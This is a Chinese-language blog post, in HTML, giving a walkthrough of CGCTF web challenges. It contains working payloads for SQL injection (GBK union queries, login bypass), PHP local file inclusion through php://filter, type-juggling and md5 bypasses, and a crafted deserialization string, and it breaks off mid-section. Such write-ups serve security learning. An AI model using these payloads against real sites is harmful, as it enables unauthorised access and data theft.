@@ -1,0 +1,1318 @@
+<!DOCTYPE html>
+<html>
+    <!-- title -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="LINK">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="LINK">
+    <meta name="keywords" content="Hexo | LINK">
+    <meta name="description" content="">
+    <meta name="Cache-Control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    <title>cgctf-web-wp · my world</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s 1;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= /css/style.css?v=20180630 as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= /css/mobile.css?v=20180630 media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/assets/favicon.ico" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+<meta name="generator" content="Hexo 7.0.0-rc2"></head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >LINK</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">cgctf-web-wp</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>LINK</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style=
+
+
+
+
+
+
+
+
+height:50vh;
+
+>
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            cgctf-web-wp
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "wp">wp</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count">4.2k</span> / Reading time: <span class="post-count">19 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2018/10/26</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <p>show time!</p>
+<span id="more"></span>
+<h1 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h1><p>右键查看源代码就出来了</p>
+<h1 id="md5-collision"><a href="#md5-collision" class="headerlink" title="md5 collision"></a>md5 collision</h1><p>源码：</p>
+<pre><code>$md51 = md5(&#39;QNKCDZO&#39;);
+$a = @$_GET[&#39;a&#39;];
+$md52 = @md5($a);
+if(isset($a))&#123;
+if ($a != &#39;QNKCDZO&#39; &amp;&amp; $md51 == $md52) &#123;
+    echo &quot;nctf&#123;*****************&#125;&quot;;
+&#125; else &#123;
+    echo &quot;false!!!&quot;;
+&#125;&#125;
+else&#123;echo &quot;please input a&quot;;&#125;
+</code></pre>
+<p>要求输入的值与QNKCDZO不同但是md5相同 <br /><br>这样的值有好几个，随便输入一个即可 <br /><br><code>?a=s878926199a</code></p>
+<h1 id="签到2"><a href="#签到2" class="headerlink" title="签到2"></a>签到2</h1><p>要求输入11位密码但是输入框限制输入10位，右键审查元素，把这个限制改成11即可 <br /></p>
+<h1 id="这题不是web"><a href="#这题不是web" class="headerlink" title="这题不是web"></a>这题不是web</h1><p>这题还真不是web <br /><br>这题看似没有任何的切入点，只有一张图片，实际上把图片保存到本地，记事本打开即可看到flag <br /></p>
+<h1 id="层层递进"><a href="#层层递进" class="headerlink" title="层层递进"></a>层层递进</h1><p>本身是个很简单的题，但是要做出来真的是很需要眼力 <br /><br>初看之下没有什么异常的地方，右键源代码之后，在iframe标签中，能发现有好几个属性都是0。src属性中，能发现一个文件，<code>SO.html</code>，访问该文件 <br /><br>在出现的新的页面中再次右键源代码，类似的地方能发现一个<code>404.html</code>文件，访问该文件 <br /><br>在新的页面中再次源代码，可以看到有一部分被注释了 <br /></p>
+<pre><code>&lt;!-- Placed at the end of the document so the pages load faster --&gt;
+&lt;!--  
+&lt;script src=&quot;./js/jquery-n.7.2.min.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;./js/jquery-c.7.2.min.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;./js/jquery-t.7.2.min.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;./js/jquery-f.7.2.min.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;./js/jquery-&#123;.7.2.min.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;./js/jquery-t.7.2.min.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;./js/jquery-h.7.2.min.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;./js/jquery-i.7.2.min.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;./js/jquery-s.7.2.min.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;./js/jquery-_.7.2.min.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;./js/jquery-i.7.2.min.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;./js/jquery-s.7.2.min.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;./js/jquery-_.7.2.min.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;./js/jquery-a.7.2.min.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;./js/jquery-_.7.2.min.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;./js/jquery-f.7.2.min.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;./js/jquery-l.7.2.min.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;./js/jquery-4.7.2.min.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;./js/jquery-g.7.2.min.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;./js/jquery-&#125;.7.2.min.js&quot;&gt;&lt;/script&gt;
+--&gt;
+</code></pre>
+<p>仔细观察，可以发现flag <br /><br><code>nctf&#123;this_is_a_fl4g&#125;</code></p>
+<h1 id="AAencode"><a href="#AAencode" class="headerlink" title="AAencode"></a>AAencode</h1><p>javascript aaencode是一种编码方式 <br /><br>直接将编码丢到控制台里运行即可 <br /><br>要求浏览器的编码为unicode</p>
+<h1 id="单身二十年"><a href="#单身二十年" class="headerlink" title="单身二十年"></a>单身二十年</h1><p>点击找到key，页面会发生两次跳转，第一次跳转为正确的页面，抓包或者禁用js都行</p>
+<h1 id="php-decode"><a href="#php-decode" class="headerlink" title="php decode"></a>php decode</h1><pre><code>&lt;?php
+function CLsI($ZzvSWE) &#123;
+ 
+    $ZzvSWE = gzinflate(base64_decode($ZzvSWE));
+ 
+    for ($i = 0; $i &lt; strlen($ZzvSWE); $i++) &#123;
+ 
+        $ZzvSWE[$i] = chr(ord($ZzvSWE[$i]) - 1);
+ 
+    &#125;
+ 
+    return $ZzvSWE;
+ 
+&#125;
+eval(CLsI(&quot;+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA==&quot;));
+?&gt;
+</code></pre>
+<p>大致意思就是创建一个函数，用特殊的方式来解码 <br /><br>需要解的码在最后，把eval改成echo即可输出解码之后的结果 <br /></p>
+<h1 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h1><p>点击click me，可以发现页面包含了一个show.php <br /><br>尝试读取源码<code>index.php?file=php://filter/read=convert.base64-encode/resource=index.php</code></p>
+<pre><code>PGh0bWw+CiAgICA8dGl0bGU+YXNkZjwvdGl0bGU+CiAgICAKPD9waHAKCWVycm9yX3JlcG9ydGluZygwKTsKCWlmKCEkX0dFVFtmaWxlXSl7ZWNobyAnPGEgaHJlZj0iLi9pbmRleC5waHA/ZmlsZT1zaG93LnBocCI+Y2xpY2sgbWU/IG5vPC9hPic7fQoJJGZpbGU9JF9HRVRbJ2ZpbGUnXTsKCWlmKHN0cnN0cigkZmlsZSwiLi4vIil8fHN0cmlzdHIoJGZpbGUsICJ0cCIpfHxzdHJpc3RyKCRmaWxlLCJpbnB1dCIpfHxzdHJpc3RyKCRmaWxlLCJkYXRhIikpewoJCWVjaG8gIk9oIG5vISI7CgkJZXhpdCgpOwoJfQoJaW5jbHVkZSgkZmlsZSk7IAovL2ZsYWc6bmN0ZntlZHVsY25pX2VsaWZfbGFjb2xfc2lfc2lodH0KCj8+CjwvaHRtbD4=
+</code></pre>
+<p>结果base64解码之后得到flag </p>
+<pre><code>&lt;html&gt;
+    &lt;title&gt;asdf&lt;/title&gt;
+    
+&lt;?php
+    error_reporting(0);
+    if(!$_GET[file])&#123;echo &#39;&lt;a href=&quot;./index.php?file=show.php&quot;&gt;click me? no&lt;/a&gt;&#39;;&#125;
+    $file=$_GET[&#39;file&#39;];
+    if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;
+        echo &quot;Oh no!&quot;;
+        exit();
+    &#125;
+    include($file); 
+//flag:nctf&#123;edulcni_elif_lacol_si_siht&#125;
+
+?&gt;
+&lt;/html&gt;
+</code></pre>
+<h1 id="单身一百年也没用"><a href="#单身一百年也没用" class="headerlink" title="单身一百年也没用"></a>单身一百年也没用</h1><p>跟之前那题一样，抓第一个包，重放之后得到flag</p>
+<h1 id="COOKIE"><a href="#COOKIE" class="headerlink" title="COOKIE"></a>COOKIE</h1><p>提示0&#x3D;&#x3D;not，抓包之后发现cookie值等于0，应该是0无法登陆的意思，改成1即可得到flag <br /></p>
+<h1 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h1><p>根据提示访问robots.txt文件，得到第二次提示，访问sql.php以及其源码</p>
+<pre><code>&lt;?php
+if($_GET[id]) &#123;
+   mysql_connect(SAE_MYSQL_HOST_M . &#39;:&#39; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);
+  mysql_select_db(SAE_MYSQL_DB);
+  $id = intval($_GET[id]);
+  $query = @mysql_fetch_array(mysql_query(&quot;select content from ctf2 where id=&#39;$id&#39;&quot;));
+  if ($_GET[id]==1024) &#123;
+      echo &quot;&lt;p&gt;no! try again&lt;/p&gt;&quot;;
+  &#125;
+  else&#123;
+    echo($query[content]);
+  &#125;
+&#125;
+?&gt;
+</code></pre>
+<h1 id="GBK-Injection"><a href="#GBK-Injection" class="headerlink" title="GBK Injection"></a>GBK Injection</h1><p>提示是GBK注入 <br /><br>尝试id&#x3D;1’ or 1&#x3D;1#，回显的语句中，发现’前面多了一个\ <br /><br>后台代码的逻辑应该是当检测到’时，在前面加上一个\，在mysql中，\之后的字符会被转义，失去其原有的功能 <br /><br>在’前面加上一个%df，因为在mysql中，gbk占两个字节，而\只有一个字节，所以当%df和\写在一起时，两个字节会结合成一个字，从而消除掉\ <br /></p>
+<pre><code>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=0%df&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()%23 //ctf,ctf2,ctf3,ctf4,news
+http://chinalover.sinaapp.com/SQL-GBK/index.php?id=0%df&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=0x63746634%23 //id,flag
+http://chinalover.sinaapp.com/SQL-GBK/index.php?id=0%df&#39; union select id,flag from ctf4%23 //nctf&#123;gbk_3sqli&#125;
+</code></pre>
+<p>需要注意的是，在输入table_name时，也需要用到单引号，但是如果在这里加入%df，就会破坏语句结构，所以这里可以将表名转换为十六进制 <br /></p>
+<h1 id="x00"><a href="#x00" class="headerlink" title="&#x2F;x00"></a>&#x2F;x00</h1><p>打开之后有源码</p>
+<pre><code>    if (isset ($_GET[&#39;nctf&#39;])) &#123;
+        if (@ereg (&quot;^[1-9]+$&quot;, $_GET[&#39;nctf&#39;]) === FALSE)
+            echo &#39;必须输入数字才行&#39;;
+        else if (strpos ($_GET[&#39;nctf&#39;], &#39;#biubiubiu&#39;) !== FALSE)   
+            die(&#39;Flag: &#39;.$flag);
+        else
+            echo &#39;骚年，继续努力吧啊~&#39;;
+    &#125;
+</code></pre>
+<p>意思是输入的字符串必须带有#biubiubiu，但是如果输入的必须为数字 <br /><br>直接用%00截断，需要注意的是，get方式传#要经过url编码才行 <br /><br>传入数组mctf[]&#x3D;1也可以得到flag</p>
+<pre><code>?nctf=1%00%23biubiubiu
+?nctf[]=1
+</code></pre>
+<h1 id="bypass-again"><a href="#bypass-again" class="headerlink" title="bypass again"></a>bypass again</h1><pre><code>if (isset($_GET[&#39;a&#39;]) and isset($_GET[&#39;b&#39;])) &#123;
+if ($_GET[&#39;a&#39;] != $_GET[&#39;b&#39;])
+if (md5($_GET[&#39;a&#39;]) == md5($_GET[&#39;b&#39;]))
+die(&#39;Flag: &#39;.$flag);
+else
+print &#39;Wrong.&#39;;
+&#125;
+</code></pre>
+<p>弱类型和md5碰撞都可以获得flag</p>
+<pre><code>?a[]=1&amp;b[]=2
+?a=QNKCDZO&amp;b=s878926199a
+</code></pre>
+<h1 id="上传绕过"><a href="#上传绕过" class="headerlink" title="上传绕过"></a>上传绕过</h1><p>要求上传一个文件，试了一下sao操作，上传php4、pht之类的后缀，都被过滤了，过滤规则有点严啊 <br /><br>仔细观察上传的包，发现其中带有路径，理所应当的想到了00截断，试了一下还能成功了</p>
+<h1 id="sql注入1"><a href="#sql注入1" class="headerlink" title="sql注入1"></a>sql注入1</h1><p>过关源码，点击就送</p>
+<pre><code>&lt;html&gt;
+&lt;head&gt;
+Secure Web Login
+&lt;/head&gt;
+&lt;body&gt;
+&lt;?php
+if($_POST[user] &amp;&amp; $_POST[pass]) &#123;
+    mysql_connect(SAE_MYSQL_HOST_M . &#39;:&#39; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);
+  mysql_select_db(SAE_MYSQL_DB);
+  $user = trim($_POST[user]);
+  $pass = md5(trim($_POST[pass]));
+  $sql=&quot;select user from ctf where (user=&#39;&quot;.$user.&quot;&#39;) and (pw=&#39;&quot;.$pass.&quot;&#39;)&quot;;
+    echo &#39;&lt;/br&gt;&#39;.$sql;
+  $query = mysql_fetch_array(mysql_query($sql));
+  if($query[user]==&quot;admin&quot;) &#123;
+      echo &quot;&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;&quot;;
+  &#125;
+  if($query[user] != &quot;admin&quot;) &#123;
+    echo(&quot;&lt;p&gt;You are not admin!&lt;/p&gt;&quot;);
+  &#125;
+&#125;
+echo $query[user];
+?&gt;
+&lt;form method=post action=index.php&gt;
+&lt;input type=text name=user value=&quot;Username&quot;&gt;
+&lt;input type=password name=pass value=&quot;Password&quot;&gt;
+&lt;input type=submit&gt;
+&lt;/form&gt;
+&lt;/body&gt;
+&lt;a href=&quot;index.phps&quot;&gt;Source&lt;/a&gt;
+&lt;/html&gt;
+</code></pre>
+<p>跟普通的Sql注入没什么两样，注意在于trim()这个函数，这个函数可以制定过滤字符串，当这个函数没有指定过滤什么字符串时，默认过滤以下所有 <br /></p>
+<pre><code>&quot;\0&quot; - NULL
+&quot;\t&quot; - 制表符
+&quot;\n&quot; - 换行
+&quot;\x0B&quot; - 垂直制表符
+&quot;\r&quot; - 回车
+&quot; &quot; - 空格
+</code></pre>
+<p>这里能影响我们的只有空格，不过既然是表单绕过，完全可以不用空格 <br /></p>
+<pre><code>user=admin&#39;||1)#&amp;pass=Password
+user=admin&#39;/**/or/**/1)#&amp;pass=Password
+</code></pre>
+<h1 id="pass-check"><a href="#pass-check" class="headerlink" title="pass check"></a>pass check</h1><p>提示给出了源代码</p>
+<pre><code>$pass=@$_POST[&#39;pass&#39;];
+$pass1=***********;//被隐藏起来的密码
+if(isset($pass))
+&#123;
+if(@!strcmp($pass,$pass1))&#123;
+echo &quot;flag:nctf&#123;*&#125;&quot;;
+&#125;else&#123;
+echo &quot;the pass is wrong!&quot;;
+&#125;
+&#125;else&#123;
+echo &quot;please input pass!&quot;;
+&#125;
+?&gt;
+</code></pre>
+<p>使!strcmp($pass,$pass1)返回true即可绕过，strcmp函数有一个漏洞，当传入的值不是字符串时，函数会报错并返回一个0，0取反为1，即为ture</p>
+<h1 id="起名字真难"><a href="#起名字真难" class="headerlink" title="起名字真难"></a>起名字真难</h1><pre><code>&lt;?php
+function noother_says_correct($number)
+&#123;
+       $one = ord(&#39;1&#39;);		//获取1的ascii值
+       $nine = ord(&#39;9&#39;);	//获取9的ascii值
+       for ($i = 0; $i &lt; strlen($number); $i++)
+       &#123;   		//遍历输入的字符串，只要输入的字符串中有数字则返回false
+               $digit = ord($number&#123;$i&#125;);
+               if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )
+               &#123;
+                       return false;
+               &#125;
+       &#125;
+          return $number == &#39;54975581388&#39;;		//把输入的字符串与54975581388对比，相同则返回true
+&#125;
+$flag=&#39;*******&#39;;
+if(noother_says_correct($_GET[&#39;key&#39;]))
+   echo $flag;
+else 
+   echo &#39;access denied&#39;;
+?&gt;
+</code></pre>
+<p>审计时要细心！细心！细心！ <br /><br>第一次看理解错误，无法理解题意，后来看明白了。要求输入的值等于54975581388，但是不允许输入数字 <br /><br>输入54975581388的十六进制，为0xccccccccc，刚好没有数字</p>
+<h1 id="密码重置"><a href="#密码重置" class="headerlink" title="密码重置"></a>密码重置</h1><p>url中的user1&#x3D;Y3RmdXNlcg&#x3D;&#x3D;非常的可疑，base64解码之后发现是ctfuser，刚好跟下面的user&#x3D;ctfuser相等，尝试把admin用base64编码，并且用表单提交user&#x3D;admin，flag就出来了 <br /></p>
+<pre><code>?user1=YWRtaW4=
+[post data]
+user=admin
+</code></pre>
+<h1 id="php反序列化"><a href="#php反序列化" class="headerlink" title="php反序列化"></a>php反序列化</h1><p>做的时候这题显示的是暂时不可做，但是很想做关于反序列化的题，就在网上找了一下这题的wp，结果意外的发现了该题的源代码。倒是可以在本地复现 <br /><br>云做题 <br /></p>
+<pre><code>&lt;?php
+class just4fun &#123;
+    var $enter;
+    var $secret;
+&#125;
+
+if (isset($_GET[&#39;pass&#39;])) &#123;
+    $pass = $_GET[&#39;pass&#39;];
+    
+    if(get_magic_quotes_gpc())&#123;
+        $pass=stripslashes($pass);
+    &#125;
+    
+    $o = unserialize($pass);
+    
+    if ($o) &#123;
+        $o-&gt;secret = &quot;*&quot;;
+        if ($o-&gt;secret === $o-&gt;enter)
+            echo &quot;Congratulation! Here is my secret: &quot;.$o-&gt;secret;
+        else 
+            echo &quot;Oh no... You can&#39;t fool me&quot;;
+    &#125;
+    else echo &quot;are you trolling?&quot;;
+?&gt;
+</code></pre>
+<p>大致的题意就是在把输入的值反序列化之后，会给secret重新赋一次值，这个值是未知的，估计是flag，之后要求sercet和enter相等即可绕过 <br /><br>只要将sercet的值引用赋值给enter即可 <br /></p>
+<pre><code>&lt;?php
+class just4fun &#123;
+    var $enter;
+    var $secret;
+&#125;
+
+$JuH0n = new just4fun();
+$JuH0n -&gt; enter = &amp;$JuH0n -&gt; secret;
+$pass = serialize($JuH0n);
+print_r($pass);
+?&gt;
+//O:8:&quot;just4fun&quot;:2:&#123;s:5:&quot;enter&quot;;N;s:6:&quot;secret&quot;;R:2;&#125; 
+</code></pre>
+<p>用pass传入即可绕过</p>
+<h1 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h1><p>右键查看源代码，获得源码</p>
+<pre><code>&lt;!--
+#GOAL: login as admin,then get the flag;
+error_reporting(0);
+require &#39;db.inc.php&#39;;
+
+function clean($str)&#123;
+    if(get_magic_quotes_gpc())&#123;		//获取当前 magic_quotes_gpc 的配置选项设置，在php5.4之后会永远返回flase
+        $str=stripslashes($str);	//删除反斜杠
+    &#125;
+    return htmlentities($str, ENT_QUOTES);	//把传入的字符串html实体化，这里的作用是把单引号实体化，就是使其无效
+&#125;
+
+$username = @clean((string)$_GET[&#39;username&#39;]);
+$password = @clean((string)$_GET[&#39;password&#39;]);
+
+$query=&#39;SELECT * FROM users WHERE name=\&#39;&#39;.$username.&#39;\&#39; AND pass=\&#39;&#39;.$password.&#39;\&#39;;&#39;;
+$result=mysql_query($query);
+if(!$result || mysql_num_rows($result) &lt; 1)&#123;
+    die(&#39;Invalid password!&#39;);
+&#125;
+
+echo $flag;
+--&gt;
+</code></pre>
+<p>提示仔细看函数的用法，所以我很仔细的研究了stripslashes()和htmlentities()函数的用法 <br /><br>思路就是绕过前面的过滤规则，让下面的sql查询语句返回真即可 <br /><br>stripslashes()删除反斜杠，htmlentities()无效单引号，配合完美，此题无解 <br /><br>其实stripslashes()只在if条件get_magic_quotes_gpc()放回true时才会执行，但是在php5.4之后这个函数永远返回false，虽然不知道服务端是php几的，但是如果是5.4之前并且开启这个函数，那么此题就无解了，但是ctf的题，永远都会有解 <br /><br>被转义的单引号实际上在sql语句查询的时候会生效，这里的转义只在php这里转义，所以我们可以把语句简化一下 <br /></p>
